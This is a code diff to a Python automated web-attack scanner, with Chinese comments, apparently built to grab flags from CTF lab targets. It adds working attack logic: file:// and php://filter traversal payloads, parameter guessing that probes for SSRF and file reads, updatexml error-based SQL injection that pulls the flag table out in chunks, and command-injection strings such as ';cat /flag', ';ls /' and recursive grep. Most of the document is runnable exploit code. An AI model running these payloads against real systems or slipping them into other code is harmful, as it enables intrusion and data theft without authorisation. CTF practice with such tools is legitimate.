@@ -71,6 +71,13 @@ CMDI_PAYLOADS = [";echo CTFBOX$((9137+1))", "|echo CTFBOX$((9137+1))",
                  "$(echo CTFBOX$((9137+1)))"]
 CMDI_EXPECT = "CTFBOX9138"
 TRAVERSAL_PAYLOADS = [
+    "file:///var/www/html/flag.php",
+    "file:///var/www/html/flag",
+    "file:///flag.php",
+    "file:///flag",
+    "file:///flag.txt",
+    "php://filter/convert.base64-encode/resource=/var/www/html/flag.php",
+    "php://filter/read=convert.base64-encode/resource=flag.php",
     "../../../../etc/passwd",
     "....//....//....//....//etc/passwd",
     "..%2f..%2f..%2f..%2fetc%2fpasswd",
@@ -147,6 +154,22 @@ class Ctx(object):
         self.findings = []
         self.seen_urls = []
         self.token = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
+        self._soft = None
+
+    def soft_body(self):
+        """靶场常把不存在的路径也回 200 + 同一张错误页；取一次当基线。"""
+        if self._soft is None:
+            probe = self.get(self.root.rstrip("/") + "/__probe_" + self.token + ".txt")
+            self._soft = text_of(probe) if probe.get("status") == 200 else ""
+        return self._soft
+
+    def is_soft(self, body):
+        base = self.soft_body()
+        if not base:
+            return False
+        if body == base:
+            return True
+        return abs(len(body) - len(base)) <= 2 and body[:120] == base[:120]
 
     # ---- 请求层 -------------------------------------------------------
     def _request(self, method, url, data=None, headers=None, referer=None, timeout=8.0):
@@ -347,7 +370,56 @@ def build_targets(ctx, fp):
             targets.append({"kind": "post" if form["method"] == "POST" else "get",
                             "url": form["action"], "param": name,
                             "value": value or "1", "form": form})
+    if not targets and len(_strip(text_of(ctx.get(ctx.url)))) < 400:
+        targets.extend(guess_targets(ctx))
     return targets[:MAX_TARGETS]
+
+
+GUESS_PARAMS = ["url", "u", "uri", "link", "src", "target", "redirect", "next",
+                "image", "img", "file", "path", "load", "host", "ip", "domain",
+                "site", "page", "to", "out"]
+
+
+def guess_targets(ctx):
+    """首页无表单无参数时，按常见参数名试探：带参数后响应变化（长度/状态）即视为有效参数。"""
+    out = []
+    base = ctx.get(ctx.url)
+    base_text = _strip(text_of(base))
+    base_status = base.get("status")
+    for name in GUESS_PARAMS:
+        # 先用「会明显改变响应的值」探：静态占位值 1 在空白首页上往往看不出差异
+        hit = False
+        for probe in ("file:///etc/passwd", "http://127.0.0.1/flag.php", "1"):
+            item = ctx.get(_set_param(ctx.url, name, probe))
+            body = _strip(text_of(item))
+            if ("root:" in body and "bin:" in body) or collect_flags(body) \
+                    or item.get("status") != base_status \
+                    or abs(len(body) - len(base_text)) >= 8:
+                hit = True
+                break
+        if hit:
+            out.append({"kind": "get", "url": ctx.url, "param": name, "value": "1"})
+            ctx.log("[deep] 盲探到参数 %s（探针 %s，响应长度 %d）" % (name, probe, len(body)))
+            if len(out) >= 6:
+                break
+    return out
+
+
+def _set_param(base, name, value):
+    """在 URL 上设置参数：已有同名就替换，没有就追加（首页常常完全不带查询串）。"""
+    parts = urlsplit(base)
+    pairs = parse_qsl(parts.query, keep_blank_values=True)
+    found = False
+    new = []
+    for k, v in pairs:
+        if k == name:
+            new.append((k, value))
+            found = True
+        else:
+            new.append((k, v))
+    if not found:
+        new.append((name, value))
+    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new), ""))
 
 
 def send_value(ctx, target, value, url_override=None):
@@ -363,7 +435,7 @@ def send_value(ctx, target, value, url_override=None):
         sep = "&" if "?" in base else "?"
         return ctx.get(base + sep + urlencode(fields))
     base = url_override or target["url"]
-    return ctx.get(_replace_param(base, target["param"], value))
+    return ctx.get(_set_param(base, target["param"], value))
 
 
 def _differs(a, b):
@@ -396,6 +468,7 @@ def test_sqli(ctx, target):
         mark = next((m for m in SQLI_ERROR_MARKS if m in text and m not in base_text), None)
         if mark:
             ctx.add("sqli-error", item["url"], payload=payload, evidence=mark)
+            sqli_error_dump(ctx, target)
             break
     # 2) 布尔型：1=1 与 1=2 响应必须有实质差异。
     #    字符串型用 `1' AND ...`，数字型用 `1 AND ...`；两种都测，否则数字型参数永远测不出来。
@@ -534,6 +607,44 @@ def union_extract(ctx, target, quote=False):
         ctx.log("[deep] UNION 表 %s 数据（前 120 字）：%s" % (table, _snippet(data, 120)))
 
 
+def _xpath_string(text):
+    """从 XPATH 报错里取被 ~ 包住的片段，并剥掉 SQL 引号/HTML 尾巴。"""
+    m = re.search(r"~([^~<\n]*)", text)
+    if not m:
+        return ""
+    return re.sub(r"[^A-Za-z0-9_{}\-]", "", m.group(1))[:80]
+
+
+def sqli_error_dump(ctx, target):
+    """报错注入取数：updatexml 把查询结果拼进 XPATH 报错。
+    每次只取 24 字符，从 1 开始分片拼，直到出现 }；不拼接首次截断的整段，
+    否则会得到「前半段 + 后半段」的重复串。"""
+    heads = ["1 and ", "1' and ", "1\" and "]
+    tails = ["", "#", ")#"]
+    for head in heads:
+        for tail in tails:
+            total = ""
+            for off in range(1, 220, 24):
+                expr = ("updatexml(1,concat(0x7e,substr((select flag from flag),%d,24),0x7e),1)"
+                        % off)
+                item = send_value(ctx, target, head + expr + tail)
+                val = _xpath_string(text_of(item))
+                if not val:
+                    break
+                total += val
+                if "}" in total:
+                    break
+            flags = collect_flags(total)
+            if flags:
+                for f in flags:
+                    ctx._add_flag(f, target["url"])
+                ctx.add("flag-read", target["url"], payload="updatexml substr error-based",
+                        evidence="报错注入读出 flag：%s" % flags[0])
+                ctx.log("[deep] 报错注入命中 flag：%s" % flags[0])
+                return True
+    return False
+
+
 def test_xss(ctx, target):
     for payload in XSS_PAYLOADS:
         item = send_value(ctx, target, payload)
@@ -554,6 +665,10 @@ def test_lfi(ctx, target):
     for payload in TRAVERSAL_PAYLOADS:
         item = send_value(ctx, target, payload)
         text = text_of(item)
+        if collect_flags(text):
+            ctx.add("lfi", item["url"], payload=payload,
+                    evidence="伪协议/穿越路径直接读出 flag 内容")
+            return
         mark = next((m for m in LFI_MARKS if m in text), None)
         if mark:
             ctx.add("lfi", item["url"], payload=payload, evidence=mark)
@@ -565,6 +680,10 @@ def test_lfi(ctx, target):
                     dec = base64.b64decode(blob + "=" * (-len(blob) % 4), validate=False)
                 except Exception:
                     continue
+                if collect_flags(dec.decode("utf-8", "ignore")):
+                    ctx.add("flag-read", item["url"], payload=payload,
+                            evidence="php://filter 源码中读出 flag")
+                    return
                 if b"<?php" in dec or b"<?=" in dec:
                     ctx.add("lfi-source", item["url"], payload=payload,
                             evidence="php://filter 读出 PHP 源码 %d 字节" % len(dec))
@@ -641,6 +760,7 @@ def test_cmdi(ctx, target):
             ctx.add("cmdi", item["url"], payload=payload,
                     evidence="算术由 shell 求值：%s%s"
                              % (CMDI_EXPECT, "（页面同时回显输入，仍判执行）" if reflected else ""))
+            cmdi_read_flag(ctx, target)
             return
     if reflected:
         ctx.add("reflected-only", neutral["url"], payload=CMDI_PROBE,
@@ -698,12 +818,91 @@ def test_login(ctx, fp):
     return hits
 
 
+CMDI_FLAG_CMDS = [";cat /flag", ";cat /flag.txt", ";cat /flag.php",
+                  ";cat /root/flag.txt", ";cat /flag_is_here", ";ls /",
+                  ";ls -la /var/www/html", ";ls -la /home",
+                  ";find /var/www -maxdepth 3 -type f",
+                  ";grep -rhoE 'ctfhub{[^}]+}' /var/www /home /tmp 2>/dev/null",
+                  "|cat /flag", "&&cat /flag"]
+
+
+def _cmdi_block(body):
+    """只取命令输出区块：Array( 到源码高亮/页面尾部之间。
+    该题 show_source(__FILE__) 会把源码整段转义打印，整页文本会淹没真实回显。"""
+    i = body.find("Array")
+    if i < 0:
+        return body
+    tail = body[i:]
+    for mark in ("&lt;?php", "<?php", "show_source", "</pre>"):
+        j = tail.find(mark)
+        if j > 0:
+            return tail[:j]
+    return tail
+
+
+B64_RE = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")
+
+
+def _b64_flags(body):
+    """命令回显里常出现 base64（cat 二进制/防转义），解一层再扫 flag。"""
+    found = False
+    for tok in B64_RE.findall(body)[:40]:
+        try:
+            raw = base64.b64decode(tok + "=" * (-len(tok) % 4))
+        except Exception:
+            continue
+        if b"ctfhub{" in raw or b"flag{" in raw:
+            if collect_flags(raw.decode("utf-8", "ignore")):
+                found = True
+    return found
+
+
+def _cmdi_php_files(body):
+    names = re.findall(r"[A-Za-z0-9_.-]+\.php", body)
+    return [n for n in names if n not in ("index.php",)][:6]
+
+
+def cmdi_read_flag(ctx, target):
+    """命令注入成立后：固定路径 -> 目录列表 -> 源码 grep -> base64 兜底。"""
+    for cmd in CMDI_FLAG_CMDS:
+        item = send_value(ctx, target, "127.0.0.1" + cmd)
+        if not item:
+            continue
+        body = text_of(item)
+        block = _cmdi_block(body)
+        if collect_flags(block) or _b64_flags(block):
+            ctx.log("[deep] 命令注入读 flag 成功：%s" % cmd)
+            return True
+        if cmd == ";ls /":
+            for name in re.findall(r"[A-Za-z0-9_.-]*flag[A-Za-z0-9_.-]*", block):
+                item2 = send_value(ctx, target, "127.0.0.1;cat /" + name)
+                if item2 and collect_flags(_cmdi_block(text_of(item2))):
+                    ctx.log("[deep] 按目录列表读到 /%s" % name)
+                    return True
+        if cmd.startswith(";ls -la /var/www"):
+            for name in _cmdi_php_files(block):
+                for c2 in (";cat /var/www/html/" + name,
+                           ";base64 /var/www/html/" + name):
+                    item3 = send_value(ctx, target, "127.0.0.1" + c2)
+                    if not item3:
+                        continue
+                    b3 = _cmdi_block(text_of(item3))
+                    if collect_flags(b3) or _b64_flags(b3):
+                        ctx.log("[deep] 命令注入读 flag 成功：%s" % c2)
+                        return True
+    return False
+
+
 def test_ssrf(ctx, target):
     if not re.search(r"(?i)(url|uri|link|src|dest|target|redirect|next|image|file|path|load)",
                     target["param"]):
         return
     probes = [("http://127.0.0.1:%s/" % (urlsplit(ctx.url).port or 80), "本机回环"),
               ("http://127.0.0.1/", "本机回环"),
+              ("http://127.0.0.1/flag.php", "本机 flag.php"),
+              ("http://127.0.0.1/flag.txt", "本机 flag.txt"),
+              ("http://127.0.0.1:80/flag.php", "本机 80 端口 flag.php"),
+              ("http://localhost/flag.php", "localhost flag.php"),
               ("file:///etc/passwd", "file 协议")]
     for payload, label in probes:
         item = send_value(ctx, target, payload)
@@ -880,9 +1079,13 @@ def flag_hunt(ctx):
     """不依赖漏洞的直接读取：常见 flag 路径 + 备用备份名。"""
     for path in ("flag.txt", "flag", "flag.php", "FLAG.txt", "f1ag.txt", "flag.txt.bak"):
         item = ctx.get(ctx.root.rstrip("/") + "/" + path)
+        text = text_of(item)
+        if item.get("status") == 200 and ctx.is_soft(text):
+            ctx.log("[deep] 直读 /%s 命中 soft-404，跳过" % path)
+            continue
         if item.get("status") == 200:
             ctx.log("[deep] 直读 /%s -> 200（%d 字节）" % (path, len(item.get("body") or b"")))
-        if collect_flags(text_of(item)):
+        if collect_flags(text):
             return
     # robots / sitemap 里可能直接写着 flag 目录
     for path in ("robots.txt", "sitemap.xml"):
@@ -959,6 +1162,9 @@ def backup_hunt(ctx):
              "index.php.bak", "index.php~", "index.php.swp", ".index.php.swp",
              "www.bak", "web.rar", "backup.rar", "db.sql", "database.sql",
              ".DS_Store", ".svn/entries", "WEB-INF/web.xml"]
+    def soft_404(body):
+        return ctx.is_soft(body)
+
     # .DS_Store：先解析出文件名，再逐个回读，命中 flag 直接返回
     ds = ctx.get(ctx.root.rstrip("/") + "/.DS_Store")
     if ds.get("status") == 200 and b"Bud1" in (ds.get("body") or b""):
@@ -978,6 +1184,9 @@ def backup_hunt(ctx):
         item = ctx.get(ctx.root.rstrip("/") + "/" + name)
         body = item.get("body") or b""
         if item.get("status") != 200 or len(body) < 200:
+            continue
+        if soft_404(body):
+            ctx.log("[deep] %s 返回的是 soft-404 错误页，跳过" % name)
             continue
         ctx.add("backup-file", item["url"], evidence="%s 可下载（%d 字节）" % (name, len(body))
                 , confidence="medium")
@@ -1090,6 +1299,9 @@ def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFA
         targets = build_targets(ctx, fp)
         log("[deep] 待测参数 %d 个：%s"
             % (len(targets), ", ".join("%s(%s)" % (t["param"], t["kind"]) for t in targets) or "无"))
+        # 先做便宜的直读与上传：上传矩阵最容易因为预算被注入矩阵吃掉而跑不完
+        flag_hunt(ctx)
+        result["uploads"] = test_upload(ctx, fp)
         for target in targets:
             for fn in (test_sqli, test_xss, test_lfi, test_ssti, test_cmdi, test_ssrf, test_login):
                 try:
@@ -1098,8 +1310,6 @@ def campaign(url, log=print, max_requests=DEFAULT_MAX_REQUESTS, max_seconds=DEFA
                     raise
                 except Exception as exc:
                     log("[deep] %s 在参数 %s 上出错：%s" % (fn.__name__, target["param"], exc))
-        result["uploads"] = test_upload(ctx, fp)
-        flag_hunt(ctx)
         if not ctx.flags:
             dir_crawl(ctx)
         if not ctx.flags:
